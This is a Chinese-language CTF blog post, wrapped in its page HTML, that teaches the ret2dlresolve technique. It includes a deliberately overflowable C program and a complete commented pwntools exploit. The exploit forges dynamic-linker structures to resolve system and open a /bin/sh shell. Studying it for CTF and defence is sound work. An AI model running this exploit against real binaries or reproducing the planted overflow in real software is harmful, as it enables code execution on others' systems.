@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.mark0519.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="ret2dlresolve话说其实一直都没有学习过ret2dl，还欠下的技术栈（二）">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn-ret2dl">
+<meta property="og:url" content="https://blog.mark0519.com/post/pwn-ret2dl.html">
+<meta property="og:site_name" content="Mark&#39;s blog">
+<meta property="og:description" content="ret2dlresolve话说其实一直都没有学习过ret2dl，还欠下的技术栈（二）">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190509224933472.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190509225100954.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190509225152272.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190509225223634.png">
+<meta property="article:published_time" content="2021-07-18T13:39:27.000Z">
+<meta property="article:modified_time" content="2021-11-21T14:17:42.967Z">
+<meta property="article:author" content="Mark0519">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="python2">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190509224933472.png">
+
+<link rel="canonical" href="https://blog.mark0519.com/post/pwn-ret2dl.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>pwn-ret2dl | Mark's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mark's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.mark0519.com/post/pwn-ret2dl.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic.imgdb.cn/item/5fbd287eb18d627113535cf8.png">
+      <meta itemprop="name" content="Mark0519">
+      <meta itemprop="description" content="菜鸡CTFer的自留地">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mark's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn-ret2dl
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-07-18 21:39:27" itemprop="dateCreated datePublished" datetime="2021-07-18T21:39:27+08:00">2021-07-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-21 22:17:42" itemprop="dateModified" datetime="2021-11-21T22:17:42+08:00">2021-11-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>话说其实一直都没有学习过ret2dl，还欠下的技术栈（二）</p>
+<span id="more"></span>
+
+<h2 id="0x00-原理"><a href="#0x00-原理" class="headerlink" title="0x00 原理"></a>0x00 原理</h2><p>在 Linux 中，程序使用 <code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 来对动态链接的函数进行重定位。</p>
+<p>当一个程序第一次调用libc中的函数时，必须首先对libc中函数的真实地址进行重定位，而这个绑定寻找真实地址的过程由<code>dl_runtime_resolve</code>完成。<br><code>dl_runtime_resolve</code>需要两个参数，一个是<code>link_map=*(GOT[1])</code>,即链接器标志信息和<code>reloc_arg</code>(标志该函数重定位入口偏移)。</p>
+<p>具体的，动态链接器在解析符号地址时所使用的重定位表项、动态符号表、动态字符串表都是从目标文件中的动态节 <code>.dynamic</code> 索引得到的。所以如果能够修改其中的某些内容使得最后动态链接器解析的符号是想要解析的符号，那么攻击就达成了</p>
+<h2 id="0x01结构描述"><a href="#0x01结构描述" class="headerlink" title="0x01结构描述"></a>0x01结构描述</h2><p>需要了解3个结构以及他们之间的关系<br><img src="https://img-blog.csdnimg.cn/20190509224933472.png" alt="在这里插入图片描述"></p>
+<p>_dll_runtime_resolve函数的2个参数<br><img src="https://img-blog.csdnimg.cn/20190509225100954.png" alt="在这里插入图片描述"><br>_dll_runtime_resolve函数的运行过程<br><img src="https://img-blog.csdnimg.cn/20190509225152272.png" alt="在这里插入图片描述"><br>2种利用方式<br><img src="https://img-blog.csdnimg.cn/20190509225223634.png" alt="在这里插入图片描述"></p>
+<h2 id="0x02-利用二的示例"><a href="#0x02-利用二的示例" class="headerlink" title="0x02 利用二的示例"></a>0x02 利用二的示例</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>buffer<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">gcc fun.c -fno-stack-protector -m32 -o fun<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>利用流程概述：<br>1.劫持程序执行流到read输入数据到bss段<br>2.用rop修改ebp的方法再次劫持执行流（这个有空单写一篇blog说明下）<br>3.劫持执行流到dl_runtime_resolve函数的push第二个参数处。设置栈中的第一个参数伪造合适的三个结构。<br>需要注意的一点是最后会把read函数got表写入为system函数的地址，但是劫持程序执行流的是dl_euntime_resolve函数返回的时候调用的搜索到的system函数。<br>exp做了详细注释</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">coding</span><span class="token expression"><span class="token operator">=</span>utf<span class="token operator">-</span><span class="token number">8</span></span></span>
+from pwn import <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>
+p<span class="token operator">=</span><span class="token function">process</span><span class="token punctuation">(</span><span class="token char">'./fun'</span><span class="token punctuation">)</span>
+
+pop_ebp_ret<span class="token operator">=</span><span class="token number">0x080484ab</span>
+leave_ret<span class="token operator">=</span><span class="token number">0x08048378</span>
+pppr<span class="token operator">=</span><span class="token number">0x080484a9</span>
+
+fake_stack_size<span class="token operator">=</span><span class="token number">0x800</span>
+bss<span class="token operator">=</span><span class="token number">0x0804a01c</span>
+read_plt<span class="token operator">=</span><span class="token number">0x080482e0</span>
+read_got<span class="token operator">=</span><span class="token number">0x0804a00c</span>
+bss_stage<span class="token operator">=</span>bss<span class="token operator">+</span>fake_stack_size
+dynsym<span class="token operator">=</span><span class="token number">0x080481cc</span> #真正dynsym的开始地址
+dynstr<span class="token operator">=</span><span class="token number">0x0804821c</span>
+plt<span class="token operator">=</span><span class="token number">0x080482d0</span>    #push ptr<span class="token punctuation">[</span>address<span class="token punctuation">]</span> _dll_run_rime_resolve的第二个参数开始入栈
+relplt<span class="token operator">=</span><span class="token number">0x08048298</span>  #真正read_rel<span class="token punctuation">.</span>plt的开始地址
+rel_offset<span class="token operator">=</span>bss_stage<span class="token operator">+</span><span class="token number">28</span><span class="token operator">-</span>relplt  #<span class="token number">7</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">=</span><span class="token number">28</span> 指向fake_<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>plt
+fake_sym_addr<span class="token operator">=</span>bss_stage<span class="token operator">+</span><span class="token number">36</span>  #伪造<span class="token punctuation">.</span>dynsym结构的开始
+align<span class="token operator">=</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr<span class="token operator">-</span>dynsym<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">)</span> #为了<span class="token number">16</span>字节对齐
+print <span class="token char">'align==>'</span><span class="token operator">+</span><span class="token function">hex</span><span class="token punctuation">(</span>align<span class="token punctuation">)</span>
+fake_sym_addr<span class="token operator">=</span>fake_sym_addr<span class="token operator">+</span>align 
+index<span class="token operator">=</span><span class="token punctuation">(</span>fake_sym_addr<span class="token operator">-</span>dynsym<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">0x10</span> #<span class="token punctuation">.</span>dynamic结构的大小为<span class="token number">0x10</span>
+print <span class="token char">'index==>'</span><span class="token operator">+</span><span class="token function">hex</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>
+r_info<span class="token operator">=</span><span class="token punctuation">(</span>index<span class="token operator">&lt;&lt;</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x7</span>  #<span class="token number">0x7</span>是属性位，导入函数都是<span class="token number">0x07</span>
+print <span class="token char">'r_info==>'</span><span class="token operator">+</span><span class="token function">hex</span><span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>
+fake_raloc<span class="token operator">=</span><span class="token function">p32</span><span class="token punctuation">(</span>read_got<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>#导入函数符号表在<span class="token punctuation">.</span>dynamic中的下标
+st_name<span class="token operator">=</span>fake_sym_addr<span class="token operator">-</span>dynstr<span class="token operator">+</span><span class="token number">16</span> # <span class="token punctuation">.</span>dynstr到字符串system的偏移
+fake_sym<span class="token operator">=</span><span class="token function">p32</span><span class="token punctuation">(</span>st_name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0x12</span><span class="token punctuation">)</span> #st_name是符号名相对于dynstr的偏移，<span class="token number">0x12</span>是固定的
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">gdb</span><span class="token expression"><span class="token punctuation">.</span><span class="token function">attach</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span></span></span>
+payload<span class="token operator">=</span><span class="token char">'a'</span><span class="token operator">*</span><span class="token number">44</span>
+payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>#调用read函数向bss段写入数据
+payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>pppr<span class="token punctuation">)</span>#read函数返回到这里用来平衡堆栈
+payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>bss_stage<span class="token punctuation">)</span> #第二次输入的地址是bss_stage
+payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
+payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>pop_ebp_ret<span class="token punctuation">)</span>#set ebp to bss<span class="token operator">+</span><span class="token number">0x800</span>  这里设置ebp为bss_stage
+payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>bss_stage<span class="token punctuation">)</span>
+payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>#把ebp<span class="token operator">+</span><span class="token number">4</span>指向的内容赋值给esp然后执行<span class="token function">ret</span><span class="token punctuation">(</span>又一次劫持程序执行流到bss_stage<span class="token operator">+</span><span class="token number">4</span>指向的内容<span class="token punctuation">)</span>   mov esp ebp<span class="token punctuation">,</span>pop ebp
+p<span class="token punctuation">.</span><span class="token function">sendline</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+<span class="token function">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+binsh<span class="token operator">=</span><span class="token char">'/bin/sh'</span>
+
+payload<span class="token operator">=</span><span class="token char">'aaaa'</span>
+payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>plt<span class="token punctuation">)</span> #执行完上面的leave_ret会执行这里 
+payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>rel_offset<span class="token punctuation">)</span> #dll_run_time_resolve函数的第二个参数（要调用导入函数<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>plt中的偏移）
+payload<span class="token operator">+=</span><span class="token char">'aaaa'</span>
+payload<span class="token operator">+=</span><span class="token function">p32</span><span class="token punctuation">(</span>bss_stage<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span>  #这里是参数（当一个函数需要被延迟绑定的时候会调用dll_run_time_resolve函数这是这个函数的参数）
+payload<span class="token operator">+=</span><span class="token char">'aaaa'</span>
+payload<span class="token operator">+=</span><span class="token char">'aaaa'</span>
+payload<span class="token operator">+=</span>fake_raloc   #fake_<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>plt
+payload<span class="token operator">+=</span><span class="token char">'a'</span><span class="token operator">*</span>align
+payload<span class="token operator">+=</span>fake_sym    #fake_<span class="token punctuation">.</span>dynsym
+payload<span class="token operator">+=</span><span class="token char">'system\0'</span>
+payload<span class="token operator">+=</span><span class="token char">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span><span class="token function">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+payload<span class="token operator">+=</span>binsh<span class="token operator">+</span><span class="token char">'\x00'</span>  #放入字符串<span class="token operator">/</span>bin<span class="token operator">/</span>sh
+payload<span class="token operator">+=</span><span class="token char">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span><span class="token function">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span><span class="token function">interactive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>提供了一种没有函数创造函数的方法。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/python2/" rel="tag"># python2</a>
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/post/pwn-overlap-1.html" rel="prev" title="pwn-overlap(1)">
+      <i class="fa fa-chevron-left"></i> pwn-overlap(1)
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/post/pwn-%E8%A6%86%E7%9B%96ebp.html" rel="next" title="pwn-覆盖ebp">
+      pwn-覆盖ebp <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2dlresolve"><span class="nav-number">1.</span> <span class="nav-text">ret2dlresolve</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%8E%9F%E7%90%86"><span class="nav-number">1.1.</span> <span class="nav-text">0x00 原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01%E7%BB%93%E6%9E%84%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.2.</span> <span class="nav-text">0x01结构描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E5%88%A9%E7%94%A8%E4%BA%8C%E7%9A%84%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.3.</span> <span class="nav-text">0x02 利用二的示例</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="nav-number">1.4.</span> <span class="nav-text">0x03 总结</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mark0519"
+      src="https://pic.imgdb.cn/item/5fbd287eb18d627113535cf8.png">
+  <p class="site-author-name" itemprop="name">Mark0519</p>
+  <div class="site-description" itemprop="description">菜鸡CTFer的自留地</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">65</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mark0519" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;mark0519" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:sunjiajun@bupt.edu.cn" title="E-Mail → mailto:sunjiajun@bupt.edu.cn" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Mark0519</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
